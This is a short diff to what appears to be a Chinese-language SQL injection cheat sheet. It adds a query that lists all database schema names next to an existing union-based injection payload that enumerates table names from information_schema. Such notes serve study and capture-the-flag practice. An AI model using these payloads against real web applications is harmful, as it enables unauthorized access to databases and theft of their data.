@@ -3,6 +3,8 @@
 ## 最简单的方法
 
 ```tex
+#查所有数据库，这个容易忽略
+SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.schemata
 # 查数据库
 payload="-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
 # 查列名
